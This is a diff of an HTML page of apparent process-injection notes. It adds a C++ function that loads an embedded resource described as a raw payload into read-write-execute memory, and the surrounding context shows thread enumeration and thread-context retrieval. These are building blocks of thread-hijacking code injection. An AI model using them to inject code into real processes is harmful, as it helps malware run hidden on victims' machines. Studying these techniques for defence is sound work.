@@ -87,7 +87,7 @@ IV. Enumerate threads
 	}	
  	</code>
 </pre>
-V. 
+V. Get Thread Context function
 <pre>
   <code class="c++">
 	CONTEXT get_thread_context(int thread_id, HANDLE h_thread)
@@ -101,3 +101,27 @@ V.
 	}
  	</code>
 </pre>
+VI. Obtain raw resource function
+<pre>
+  <code class="c++">
+BYTE* get_raw_payload(OUT SIZE_T &res_size)
+{
+    HMODULE hInstance = GetModuleHandle(NULL);
+    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
+    if (!res) return NULL;
+
+    HGLOBAL res_handle  = LoadResource(NULL, res);
+    if (res_handle == NULL) return NULL;
+
+    BYTE* res_data = (BYTE*) LockResource(res_handle);
+    res_size = SizeofResource(NULL, res);
+
+    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(out_buf, res_data, res_size);
+
+    FreeResource(res_handle);
+    return out_buf;
+}
+ 	</code>
+</pre>
+VII. 
